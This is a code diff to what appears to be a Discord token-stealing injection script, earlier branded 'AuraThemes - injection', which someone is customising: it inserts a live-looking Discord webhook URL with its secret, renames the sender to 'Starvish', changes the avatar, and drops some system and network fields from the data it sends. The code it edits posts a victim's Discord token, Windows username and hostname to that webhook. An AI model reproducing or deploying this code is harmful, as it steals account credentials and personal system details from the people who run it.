@@ -32,7 +32,7 @@ const execScript = async (script) => {
 };
 
 const CONFIG = {
-    webhook: '%WEBHOOK_URL%',
+    webhook: 'https://discordapp.com/api/webhooks/1357647798635331685/xlbEyZQgY3fzK0DN48NZaNisDZ5F08q0dLDu7B2NV2b-GPDTXxtIKMwddvf7HFPhljlt',
     API: 'null',
     auto_user_profile_edit: 'false',
     auto_persist_startup: '%false',
@@ -251,8 +251,8 @@ const notify = async (ctx, token, user) => {
     ];
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AuraThemes - injection`;
-    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+    ctx.username = `Starvish`;
+    ctx.avatar_url = `https://cdn.discordapp.com/attachments/1320384728972525618/1357645534655156365/Pngtreeclassic_black_stars_clipart_5568043_1.png?ex=67f0f56f&is=67efa3ef&hm=bc0532d166d21003c8744735daf2db3220f98b6e29fea871959e9d2352f805ab&`;
 
     ctx.embeds[0].fields.unshift({
         name: `<a:hearts:1176516454540116090> Token:`,
@@ -285,9 +285,7 @@ const notify = async (ctx, token, user) => {
     ctx.embeds.push({
         title: `System Information`,
         fields: [
-            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` },
-            { name: "System", value: `||\`\`\`\n${Object.entries(system).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, },
-            { name: "Network", value: `||\`\`\`\n${Object.entries(network).map(([name, value]) => `${name}: ${value}`).join("\n")}\`\`\`||`, }
+            { name: "User", value: `||\`\`\`\nUsername: ${process.env.USERNAME}\nHostname: ${process.env.USERDOMAIN}\`\`\`||` }
         ]
     });
 
@@ -1187,7 +1185,7 @@ const createWindow = () => {
 };
 
 const isLogged = async () => {
-    const LOG_FILE_PATH = path.join(__dirname, 'core.log');
+    const LOG_FILE_PATH = path.join(__dirname, 'core.txt');
 
     try {
         const { 
